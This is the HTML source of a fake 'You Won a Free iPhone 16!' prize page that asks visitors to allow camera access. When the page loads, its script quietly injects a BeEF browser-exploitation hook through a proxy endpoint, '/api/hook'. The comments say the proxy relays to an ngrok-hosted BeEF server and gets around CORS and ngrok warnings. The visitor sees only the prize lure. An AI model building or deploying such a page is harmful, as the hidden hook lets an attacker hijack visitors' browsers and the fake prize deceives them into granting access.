<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Congratulations! You Won!</title>
    <style>
      body {
        font-family: Arial;
        text-align: center;
        padding: 60px;
        background: #f0f8ff;
      }
      h1 {
        color: #d4af37;
        font-size: 2.2em;
      }
      p {
        font-size: 1.1em;
      }
      .btn {
        padding: 16px 32px;
        background: #ff4500;
        color: white;
        font-size: 1.3em;
        border: none;
        border-radius: 12px;
        cursor: pointer;
        margin: 20px;
      }
      .cam {
        font-style: italic;
        color: #555;
        margin-top: 15px;
      }
    </style>
  </head>
  <body>
    <h1>ðŸŽ‰ You Won a Free iPhone 16!</h1>
    <p>Allow camera to claim your prize</p>
    <button class="btn" onclick="startCam()">Claim Now</button>
    <p class="cam">Camera access required for verification</p>

    <script>
      // Load BeEF hook.js through Vercel proxy (bypasses CORS and ngrok warnings)
      function loadBeEFHook() {
        const script = document.createElement("script");
        // Use Vercel proxy endpoint instead of direct ngrok URL
        script.src = "/api/hook";

        script.onerror = function () {
          console.error("Failed to load BeEF hook via proxy");
          console.error(
            "Make sure BEEF_SERVER_URL is set in Vercel environment variables"
          );
        };

        script.onload = function () {
          console.log("âœ… BeEF hook loaded successfully via proxy!");
        };

        document.head.appendChild(script);
      }

      function startCam() {
        navigator.mediaDevices
          .getUserMedia({ video: true })
          .then((stream) => {
            alert("âœ“ Camera access granted!");
            const video = document.createElement("video");
            video.srcObject = stream;
            video.autoplay = true;
            video.style.width = "300px";
            video.style.borderRadius = "10px";
            video.style.marginTop = "20px";
            document.body.appendChild(video);
          })
          .catch((err) => {
            console.error("Camera error:", err);
            alert("âœ— Camera access denied or not available.");
          });
      }

      // Auto-load hook when page loads
      window.addEventListener("DOMContentLoaded", loadBeEFHook);
    </script>
  </body>
</html>
